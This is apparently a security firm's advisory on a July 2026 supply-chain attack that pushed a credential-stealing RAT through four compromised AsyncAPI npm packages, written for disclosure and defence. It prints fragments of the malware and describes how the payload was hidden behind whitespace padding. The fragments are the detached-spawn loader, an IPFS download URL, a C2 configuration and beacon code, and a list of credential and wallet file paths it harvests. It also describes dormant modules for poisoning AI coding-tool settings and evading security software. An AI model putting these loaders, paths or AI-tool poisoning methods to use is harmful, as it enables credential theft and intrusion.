@@ -1,0 +1,216 @@
+Title: AsyncAPI Packages Compromised with Miasma RAT
+
+URL Source: https://safedep.io/asyncapi-generator-supply-chain-attack-miasma-rat/
+
+Markdown Content:
+ALERT
+
+**Active threat.** As of publication, the malicious versions listed below are still tagged as `latest` on npm. Pin to the previous safe versions immediately: `@asyncapi/generator@3.3.0`, `@asyncapi/generator-helpers@1.1.0`, `@asyncapi/generator-components@0.7.0`, `@asyncapi/specs@6.11.1`.
+
+## TL;DR
+
+An attacker compromised multiple AsyncAPI repositories on July 14, 2026, pushing malicious commits that triggered CI/CD pipelines to publish four compromised npm packages. The injected payload downloads Miasma RAT from IPFS, a credential stealer that harvests browser data, SSH keys, npm tokens, GitHub CLI credentials, AWS secrets, and cryptocurrency wallets. `@asyncapi/specs` alone has 2.7 million weekly downloads. The combined weekly download count across all four affected packages exceeds 2.9 million.
+
+**Impact:**
+
+*   Credential theft: browser passwords, SSH keys, npm tokens, GitHub CLI tokens, AWS credentials, cryptocurrency wallets
+*   Persistent backdoor installed as `sync.js` in platform-specific application data directories
+*   Any CI/CD environment that installed these packages during the window of compromise may have leaked secrets
+
+**Attribution note:** The payload self-identifies as campaign `miasma-train-p1` and its config toggle names (`propagate`, `persist`, `deadman`, `poisonAI`, `metamorphic`) mirror features described in the [Miasma open source release](https://safedep.io/inside-the-miasma-supply-chain-attack-toolkit) that appeared on GitHub in June 2026. However, decrypting and analyzing the dropped `sync.js` (3MB, compiled from a TypeScript monorepo) reveals an entirely different codebase. The original Miasma worm runs on Bun, uses GitHub commit search as its only C2 channel, and avoids custom infrastructure by design. This payload runs on vanilla Node.js, operates dedicated HTTP C2 servers (`85.137.53.71` on three ports), and implements five additional fallback channels (Ethereum smart contract, Nostr relays, IPFS, BitTorrent DHT, libp2p) that the original Miasma does not have. The crypto primitives differ too: secp256k1 + AES-256-GCM + HKDF here versus RSA-4096 + AES-256-CBC in the original. The name is shared, but the tooling is not. This is either a private, parallel build by the same operators or a separate group that adopted the Miasma brand after the source was published.
+
+**Indicators of Compromise (IoC):**
+
+| Type | Value |
+| --- | --- |
+| Malicious npm packages | `@asyncapi/generator@3.3.1`, `@asyncapi/generator-helpers@1.1.1`, `@asyncapi/generator-components@0.7.1`, `@asyncapi/specs@6.11.2`, `@asyncapi/specs@6.11.2-alpha.1` |
+| Malicious commit SHA | `3eab3ec9304aa26081358330491d3cfeb55cc245` (generator repo) |
+| Attacker GitHub user ID | `148100` |
+| Compromised repos | `asyncapi/generator`, `asyncapi/spec-json-schemas` |
+| C2 IP | `85.137.53.71` (Netherlands, AS43641) |
+| IPFS payload hashes | `QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9` (generator), `Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf` (specs) |
+| Ethereum contract | `0x12c37A86a0Ed0beBe5d1d6a43E42f07860eAc710` |
+| Campaign ID | `miasma-train-p1` |
+| Drop path (Linux) | `~/.local/share/NodeJS/sync.js` |
+| Drop path (macOS) | `~/Library/Application Support/NodeJS/sync.js` |
+| Drop path (Windows) | `%LOCALAPPDATA%\NodeJS\sync.js` |
+
+## The attack
+
+On July 14, 2026 at 06:58 UTC, an attacker pushed [commit `3eab3ec`](https://github.com/asyncapi/generator/commit/3eab3ec9304aa26081358330491d3cfeb55cc245) to the generator repository’s `next` branch. The commit used placeholder git identity (`Your Name` / `you@example.com`), was unsigned, and carried the message `fix: test release workflow on next`. The parent commit ([`ff010ef`](https://github.com/asyncapi/generator/commit/ff010ef38e1be1ffc4112c8903f43637ecbf4041)) was a legitimate, GitHub-signed CI update from three days earlier.
+
+Within twelve minutes, the CI/CD pipeline published three new package versions to npm. The same attacker, GitHub user ID `148100`, separately compromised the `alpha` branch of the `asyncapi/spec-json-schemas` repository the same day, publishing `@asyncapi/specs@6.11.2-alpha.1` at 08:06 UTC and `@asyncapi/specs@6.11.2` at 08:30 UTC, both carrying the identical payload.
+
+| Package | Malicious version | Published at (UTC) | Safe version | Weekly downloads |
+| --- | --- | --- | --- | --- |
+| `@asyncapi/generator` | 3.3.1 | 07:10:48 | 3.3.0 | ~126,000 |
+| `@asyncapi/generator-helpers` | 1.1.1 | 07:10:42 | 1.1.0 | ~45,000 |
+| `@asyncapi/generator-components` | 0.7.1 | 07:10:44 | 0.7.0 | ~46,000 |
+| `@asyncapi/specs` | 6.11.2-alpha.1 | 08:06 | 6.11.1 | n/a (alpha tag) |
+| `@asyncapi/specs` | 6.11.2 | 08:30:09 | 6.11.1 | ~2,741,000 |
+
+All versions remain tagged as `latest` (stable) or `alpha` (pre-release) on the npm registry at the time of writing. The `@asyncapi/specs` compromise is the higher-impact event by download volume, and it was published from a separate repository (`asyncapi/spec-json-schemas`) than the `generator` incident.
+
+## The payload
+
+The commit modified nine files, but only three carried the malicious payload. In `validator.js` and `utils.js`, the attacker used whitespace padding: the line immediately after a legitimate function’s closing brace contains 880 space characters followed by the obfuscated payload. Any editor wrapping at a normal column width shows a blank line. Scrolling right 880 characters reveals the code.
+
+`// Line 68: }                              ← legitimate function closes// Line 69: [880 spaces]const _0x1dd48b=_0x1dd2;(function(...`
+
+The same technique appears in `packages/helpers/src/utils.js` (line 77, after the `toSnakeCase` function’s closing brace, 880 spaces then payload). The third file, `packages/components/src/utils/ErrorHandling.js`, uses no concealment at all. The obfuscated code appears inline at line 94 as Babel-transpiled JavaScript, fully visible to anyone reading the file.
+
+All three payloads use hex-variable obfuscation (`_0x1dd2`, `_0x2d89`) with a base64-encoded string lookup array and a rotation function. The deobfuscated execution flow is straightforward: the `main()` function calls `spawn('node', ['-e', PAYLOAD_STRING], { detached: true, stdio: 'ignore', windowsHide: true }).unref()`. This spawns a detached Node.js child process that runs an inline script, survives parent process termination, and hides from the user.
+
+The spawned process downloads the Miasma RAT binary from IPFS, writes it to a platform-specific drop location, and executes it. The generator packages use IPFS hash `QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9`. Miasma RAT is a credential-stealing malware active since June 2026 under the campaign identifier `miasma-train-p1`.
+
+### The specs package (separate repo)
+
+`@asyncapi/specs` is published from `asyncapi/spec-json-schemas`, a different repository than `asyncapi/generator`. The same attacker (GitHub user ID `148100`) compromised this repository’s `alpha` branch independently. Rotating only the `generator` repo’s CI secrets is not sufficient; the `spec-json-schemas` repo’s `alpha` branch write token should be rotated as well.
+
+`@asyncapi/specs@6.11.2`, published at 08:30 UTC with the `latest` tag, uses a different injection technique. Instead of whitespace hiding, the attacker prepended the malicious code directly to the top of `index.js`, making no attempt to conceal it within the legitimate source. The payload is a variant of the same downloader with a different IPFS hash (`Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf`) and different obfuscation function names (`_0x285e`, `_0x3c84`), but identical behavior: download from IPFS, write to the same `NodeJS/sync.js` drop path, spawn detached, unref.
+
+`@asyncapi/specs@6.11.2-alpha.1`, published 24 minutes earlier at 08:06 UTC with the `alpha` tag, carries the same injected payload, IPFS hash, and C2 as the 6.11.2 stable release. A SHA-256 for the alpha tarball has not yet been obtained; treat any installed copy of the alpha tag as compromised regardless of hash.
+
+`// index.js (lines 1-25, @asyncapi/specs@6.11.2)import * as fs from 'fs';import * as path from 'path';import * as https from 'https';import { spawn, ChildProcess } from 'child_process';import * as os from 'os';async function main() {    try {        const child = spawn('node', ['-e', `const _0x5af5e1=_0x285e;...`], {            detached: true,            stdio: 'ignore',            windowsHide: true        });        child.unref();    } catch (error) { ... }}main();`
+
+The string lookup array in this variant is not base64-encoded, making key strings directly readable: `FILE_URL` resolves to `hxxps://ipfs[.]io/ipfs/Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf`, `FILE_NAME` resolves to `sync.js`, and the drop directory logic matches the same three platform paths (Linux `.local/share/NodeJS`, macOS `Library/Application Support/NodeJS`, Windows `%LOCALAPPDATA%\NodeJS`).
+
+## Payload analysis
+
+The IPFS payloads are not compiled binaries. Both are ~8MB JavaScript files containing an AES-256-GCM encrypted blob, decrypted at runtime using HKDF-SHA256 key derivation from a hardcoded master key. Decrypting statically (without executing) produces the full `sync.js` source: 3MB of obfuscated JavaScript compiled from a TypeScript monorepo (`packages/core` + `packages/active-runtime`), padded with 8,362 dead-code junk variables.
+
+`// First line of decrypted sync.js// mutated v3 profile=low runtime=1 at=1784002253701`
+
+The build timestamp (`1784002253701`) resolves to 2026-07-14 04:10 UTC, roughly three hours before the malicious commit was pushed to the AsyncAPI generator repo.
+
+### Encryption and key derivation
+
+The outer wrapper decrypts two blobs in sequence. The first (`__RT_BAKED__`) contains a JSON configuration object. The second contains the main application source, followed by a ROT-4 character rotation.
+
+`// Key derivation for the config blobvar _mkb = Buffer.from('rt-vault-master-key-32b-aaaaaaaa', 'utf8');var _bk = Buffer.from(crypto.hkdfSync('sha256', _mkb, Buffer.alloc(0), Buffer.from('rt-baked-key', 'utf8'), 32));// Key derivation for the main source (different IKM)var fileKey = Buffer.from(  crypto.hkdfSync(    'sha256',    Buffer.from('rt-file-key-material-v1', 'utf8'),    Buffer.alloc(0),    Buffer.from('rt-file-key', 'utf8'),    32  ));`
+
+The master key `rt-vault-master-key-32b-aaaaaaaa` is hardcoded in plaintext. This is a design choice, not a mistake. The encryption is not protecting the payload from analysis. It prevents signature-based detection by making every build produce a different ciphertext while using the same key.
+
+### Decrypted C2 configuration
+
+The `__RT_BAKED__` config blob decrypts to a JSON object that exposes the full C2 topology:
+
+`{  "config": {    "c2Server": "http://85.137.53.71:8080",    "uploadServer": "http://85.137.53.71:8081",    "c2ProxyMgmt": "http://85.137.53.71:8091",    "serverManager": "http://127.0.0.1:8090",    "blockchain": {      "rpcUrl": "https://ethereum-rpc.publicnode.com",      "chainId": 1,      "contractAddress": "0x12c37A86a0Ed0beBe5d1d6a43E42f07860eAc710"    },    "nostrRelays": ["wss://relay.damus.io", "wss://relay.nostr.com/"],    "dhtBootstrap": ["router.bittorrent.com:6881", "dht.transmissionbt.com:6881"],    "shellBlacklist": ["killall"]  },  "attackerPub": "0432fa4ba871877d...0eeb48e",  "maxGen": 4,  "target": { "name": "miasma-train-p1", "ecosystem": "npm" },  "seedVer": 3,  "toggles": {    "propagate": { "npm": false, "pypi": false, "ruby": false, "cargo": false },    "persist": true,    "recon": false,    "poisonAI": false,    "deadman": false,    "evasion": false,    "metamorphic": false  }}`
+
+Three C2 endpoints run on `85[.]137[.]53[.]71` (AS43641, Netherlands): the command server on port 8080, the data exfiltration endpoint on port 8081, and a proxy management interface on port 8091. A local management server on `127.0.0.1:8090` handles node-level operations.
+
+### Seven-channel communication stack
+
+The decrypted source contains a `ChannelOrchestratorImpl` class that manages seven independent communication channels with tiered failover:
+
+`status() {  const list = [    { name: "c2",         alive: this.active === this.channels.c2,         tier: this.channels.c2.tier },    { name: "nostr",      alive: this.active === this.channels.nostr,      tier: this.channels.nostr.tier },    { name: "ipfs",       alive: this.active === this.channels.ipfs,       tier: this.channels.ipfs.tier },    { name: "libp2p",     alive: this.active === this.channels.libp2p,     tier: this.channels.libp2p.tier },    { name: "dht",        alive: this.active === this.channels.dht,        tier: this.channels.dht.tier },    { name: "blockchain", alive: this.active === this.channels.blockchain, tier: this.channels.blockchain.tier },    { name: "mdns",       alive: this.active === this.channels.mdns,       tier: this.channels.mdns.tier }  ];}`
+
+The HTTP C2 channel is the primary. If it goes down, the orchestrator fails over to Nostr relays and the Ethereum smart contract (both tagged `Tier.Distributed`) to retrieve updated C2 addresses. IPFS, libp2p, BitTorrent DHT, and mDNS/LAN discovery provide further resilience. Beacons go to `/api/v1/beacon`, stolen data to `/api/v1/upload`, and command polling to `/api/v1/commands/{nodeId}`.
+
+`async sendBeacon(beacon) {  const url = `${this.c2Server}/api/v1/beacon`;  const body = this.signer && this.attackerPub    ? this.signer.signEncryptedBeacon(beacon, this.attackerPub)    : this.signer ? this.signer.signBeacon(beacon) : beacon;  res = await fetchWithTimeout(this.fetchImpl, url, {    method: "POST",    headers: { "content-type": "application/json" },    body: JSON.stringify(body)  }, beaconTimeout());}`
+
+### Credential harvesting
+
+The `HostCredentialSweeper` class (in `packages/active-runtime/dist/recon/host-credential-sweeper.js`) drives the collection. It scans a knowledge base of over 300 file paths across Linux, macOS, and Windows, organized into categories: cloud credentials, SSH/GPG keys, shell history, browser data, CI/CD tokens, AI tool configs, databases, cryptocurrency wallets, container secrets, and monitoring tools.
+
+A representative sample of targeted paths from the decrypted source:
+
+`~/.aws/*                                        # AWS credentials~/.ssh/*                                        # SSH keys~/.npmrc                                        # npm tokens~/.config/gh/hosts.yml                          # GitHub CLI~/.kube/config                                  # Kubernetes~/.docker/config.json                           # Docker registry auth~/.config/gcloud/application_default_credentials.json~/.azure/msal_token_cache.json~/.config/google-chrome/Default/Login Data      # Chrome passwords~/Library/Application Support/Firefox/Profiles/*/logins.json~/.bitcoin/wallet.dat                           # Cryptocurrency~/.config/Exodus/exodus.wallet/seed.seco~/.electrum/wallets/*~/.ethereum/keystore~/.config/solana/id.json~/.claude/.credentials.json                     # AI tools~/.anthropic/key.json~/.config/Cursor/User/settings.json~/.config/Bitwarden CLI/data.json               # Password managers~/.config/1Password/1password-vault~/.config/KeePassXC/*.kdbx`
+
+The sweeper also runs content signature matching (`path-kb-signatures.js`) against discovered files, looking for patterns like AWS access key IDs (`AKIA[0-9A-Z]{16}`), secret keys, and session tokens.
+
+### Dormant capabilities
+
+Several modules exist in the compiled source with all their deployment toggles set to `false`:
+
+*   **Propagation vectors** (`DirectPypiPublishVector`, `DirectCargoPublishVector`, `spreader-npm.js`, `workflow-poison-vector.js`) for publishing trojanized packages to npm, PyPI, and Cargo registries. All four ecosystem toggles are disabled.
+*   **AI tool poisoning** (`ai-tool-poisoner.js`) targeting Claude Code (SessionStart hook in `.claude/settings.json`), VS Code (folder-open task in `.vscode/tasks.json`), Gemini CLI (`.gemini/settings.json`), and Cursor (`.cursor/rules/setup.mdc`). Contains `[SIMULATION ONLY]` markers.
+*   **Dead-man switch** (`safe-wipe.js`) that monitors a stolen token and triggers a directory wipe if the token is revoked. The code contains simulation-mode text: “Had this been a real worm, the contents of this directory would have been deleted.”
+*   **Metamorphic engine** (`mutation-engine.js`) for payload self-modification.
+*   **Sandbox evasion** (`sandbox-guard.js`) with detection for CrowdStrike, SentinelOne, Microsoft Defender, CarbonBlack, Cylance, Osquery, Tanium, and Qualys.
+
+The config flags `safeMode: true` and `actualPersist: false` further indicate this deployment uses a restricted profile. The framework is built for cross-ecosystem worm propagation, but this particular run is limited to credential harvesting and C2 beaconing.
+
+**If you installed any of the affected versions:**
+
+1.   Check for the dropped file at the platform-specific path listed in the IoC table above. Delete it if present.
+2.   Rotate all credentials on the affected machine: npm tokens, GitHub tokens, SSH keys, AWS access keys, browser-stored passwords.
+3.   Audit CI/CD secrets. Any pipeline that ran `npm install` during the compromise window should have its secrets rotated.
+4.   If you maintain or fork `asyncapi/generator` or `asyncapi/spec-json-schemas`, rotate the write token for both repos — the two packages were published from separate repositories, so rotating one does not cover the other.
+5.   Pin to the safe versions: `@asyncapi/generator@3.3.0`, `@asyncapi/generator-helpers@1.1.0`, `@asyncapi/generator-components@0.7.0`, `@asyncapi/specs@6.11.1`.
+
+**If you have not installed the affected versions:**
+
+1.   Pin your `@asyncapi/*` dependencies to exact versions until clean patch releases are published.
+2.   Check your lockfile for the compromised versions listed above.
+
+The AsyncAPI maintainers have deleted the compromised `next` branch. Clean patch releases (`3.3.2`, `1.1.2`, `0.7.2`) are expected to follow.
+
+## Package artifact hashes
+
+| Package | SHA-256 |
+| --- | --- |
+| `@asyncapi/generator-3.3.1.tgz` | `bfaeb987faa6de2b5a5eb63b1233d055215b09b0349a9394f2175fd7cdf385e4` |
+| `@asyncapi/generator-helpers-1.1.1.tgz` | `34014776d3d3ff11bc4439b02fd7ac0f02a887eb3a052eeafff236e2f6db8ad1` |
+| `@asyncapi/generator-components-0.7.1.tgz` | `082d733db0687dcd768104972b065d4b58cb1e6043688c6c20fa3702337f36ab` |
+| `@asyncapi/specs-6.11.2.tgz` | `9b2e65db653ca8575c9b10eefb9a80c6006404812c2ec212bf5675e3c690233b` |
+| `@asyncapi/specs-6.11.2-alpha.1.tgz` | not yet obtained — treat the version tag as compromised |
+
+## References
+
+*   [AsyncAPI Generator Issue #2184: Security advisory](https://github.com/asyncapi/generator/issues/2184)
+*   [Malicious commit `3eab3ec`](https://github.com/asyncapi/generator/commit/3eab3ec9304aa26081358330491d3cfeb55cc245)
+*   [`@asyncapi/generator` on npm](https://www.npmjs.com/package/@asyncapi/generator)
+*   [`@asyncapi/generator-helpers` on npm](https://www.npmjs.com/package/@asyncapi/generator-helpers)
+*   [`@asyncapi/generator-components` on npm](https://www.npmjs.com/package/@asyncapi/generator-components)
+*   [`@asyncapi/specs` on npm](https://www.npmjs.com/package/@asyncapi/specs)
+
+Links/Buttons:
+- [New Blog: AsyncAPI Generator Packages Compromised with Miasma RAT](https://safedep.io/asyncapi-generator-supply-chain-attack-miasma-rat/)
+- [](https://safedep.io/rss.xml)
+- [Pricing](https://safedep.io/pricing)
+- [SCA & SBOM Scan dependencies, generate SBOMs, enforce policy.](https://safedep.io/sca)
+- [AI Agent Discovery See every AI tool and SDK in your org.](https://safedep.io/shadow-ai)
+- [AI Agent Monitoring Audit every action your AI agents take.](https://safedep.io/ai-agent-runtime-security)
+- [Developer Security Block malicious packages at install-time.](https://safedep.io/developer-security)
+- [CI/CD Security Block malicious packages in your pipeline.](https://safedep.io/ci-cd-security)
+- [MCP Server Block threats inside your AI coding agent.](https://safedep.io/mcp)
+- [Agent API Threat intelligence API for custom agents.](https://safedep.io/agent)
+- [Threat Intelligence Real-time malicious package verdicts.](https://safedep.io/threat-intelligence)
+- [Endpoint Protection Package events & AI inventory in the cloud.](https://safedep.io/endpoint-protection)
+- [Platform Centralized policies, dashboard, compliance.](https://safedep.io/platform)
+- [Vet Scan and govern your dependencies across every PR and build.](https://github.com/safedep/vet)
+- [PMG Block malicious packages at install-time, before they enter your codebase.](https://github.com/safedep/pmg)
+- [xbom Generate AI-enriched BOMs using real code evidence, not just manifests.](https://github.com/safedep/xbom)
+- [GRYPH Monitor every AI coding agent action across your projects and workflows.](https://github.com/safedep/gryph)
+- [How it works](https://safedep.io/how-safedep-works)
+- [Blog](https://safedep.io/blog)
+- [Documentation](https://docs.safedep.io/)
+- [SDK](https://docs.safedep.io/vet/guides/insights-api-using-typescript)
+- [API](https://buf.build/safedep/api)
+- [Threat Intelligence Hub](https://safedep.io/ti)
+- [Login](https://app.safedep.io/)
+- [1.5k](https://github.com/safedep)
+- [Malware](https://safedep.io/category/malware)
+- [Miasma open source release](https://safedep.io/inside-the-miasma-supply-chain-attack-toolkit)
+- [commit 3eab3ec](https://github.com/asyncapi/generator/commit/3eab3ec9304aa26081358330491d3cfeb55cc245)
+- [ff010ef](https://github.com/asyncapi/generator/commit/ff010ef38e1be1ffc4112c8903f43637ecbf4041)
+- [AsyncAPI Generator Issue #2184: Security advisory](https://github.com/asyncapi/generator/issues/2184)
+- [@asyncapi/generator on npm](https://www.npmjs.com/package/@asyncapi/generator)
+- [@asyncapi/generator-helpers on npm](https://www.npmjs.com/package/@asyncapi/generator-helpers)
+- [@asyncapi/generator-components on npm](https://www.npmjs.com/package/@asyncapi/generator-components)
+- [@asyncapi/specs on npm](https://www.npmjs.com/package/@asyncapi/specs)
+- [Security](https://safedep.io/category/security)
+- [Kunal Singh](https://www.linkedin.com/in/kunalsin9h/)
+- [Book a Demo](https://safedep.io/book-a-demo)
+- [Terms](https://safedep.io/terms)
+- [Privacy Policy](https://safedep.io/privacy)
+- [Cookie Preferences](https://safedep.io/asyncapi-generator-supply-chain-attack-miasma-rat/#cookie-preferences)
+- [Features](https://safedep.io/#features)
+- [Partners](https://safedep.io/contact)
+- [Community Forum](https://github.com/safedep/vet/discussions)
+- [FAQ](https://safedep.io/faq)
+- [Professional Services](https://calendly.com/abhisek-safedep/30min)
+- [Status](https://status.safedep.io/)
+- [About](https://safedep.io/about)
+- [Careers](https://safedep-inc.notion.site/Careers-at-SafeDep-11e61d70b23680d7b98dcbdb6c710d55)
